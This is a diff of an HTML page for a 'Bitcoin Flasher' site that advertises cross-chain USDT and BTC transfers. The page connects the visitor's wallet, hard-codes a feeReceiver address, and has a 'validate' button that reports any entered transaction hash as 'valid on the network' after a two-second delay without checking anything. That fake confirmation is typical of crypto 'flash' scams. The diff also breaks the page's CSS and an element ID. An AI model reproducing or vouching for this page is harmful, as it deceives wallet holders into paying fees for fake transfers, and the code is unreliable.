@@ -9,10 +9,10 @@
     <meta name="keywords" content="Bitcoin Flasher, BTC Transactions, USDT Sender, ERC20, BEP20, Polygon, Blockchain Transfers">
     <meta name="robots" content="index, follow">
 
-    <!-- Canonical and Open Graph Links -->
+    <!-- Canonical and Open Graph links -->
     <link rel="canonical" href="https://bitcoin-flasher.github.io/bitcoin-flasher/">
     <meta property="og:title" content="Bitcoin Flasher - Secure Transactions">
-    <meta property="og:description" content="Bitcoin Flasher simplifies cross-chain USDT and BTC transfers with seamless wallet integration.">
+    <meta property="og:description" content="Bitcoin Flasher simplifies Cross-chain USDT and BTC transfers with seamless wallet integration.">
     <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=Bitcoin+Flasher">
     <meta property="og:url" content="https://bitcoin-flasher.github.io/bitcoin-flasher/">
     <meta property="og:type" content="website">
@@ -31,7 +31,7 @@
 
     <title>Bitcoin Flasher - Secure BTC & USDT Transfers</title>
 
-    <!-- Custom Styling -->
+    <!-- Custom styling -->
     <style>
         body {
             background-color: #000;
@@ -47,11 +47,11 @@
             box-shadow: 0 4px 10px rgba(255, 153, 0, 0.3);
         }
         .btn-primary {
-            background-color: #ff9900;
+            background color: #ff9900;
             border: none;
         }
         .btn-primary:hover {
-            background-color: #e68300;
+            background color: #e68300;
         }
         input, button {
             margin-top: 10px;
@@ -100,7 +100,7 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
         let web3, account;
-        const feeReceiver = "0x3A06322e9F1124F6B2de8F343D4FDce4D1009869";
+        const feeReceiver = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";
 
         // Connect Wallet
         document.getElementById('connectWallet').addEventListener('click', async () => {
@@ -147,7 +147,7 @@
         document.getElementById('validateBtn').addEventListener('click', () => {
             const txHash = document.getElementById('txHash').value;
             if (txHash) {
-                document.getElementById('validationResult').textContent = `Transaction ${txHash} is being validated...`;
+                document.getElementById('validation result').textContent = `Transaction ${txHash} is being validated...`;
                 setTimeout(() => {
                     document.getElementById('validationResult').textContent = `Transaction ${txHash} is valid on the network!`;
                 }, 2000);
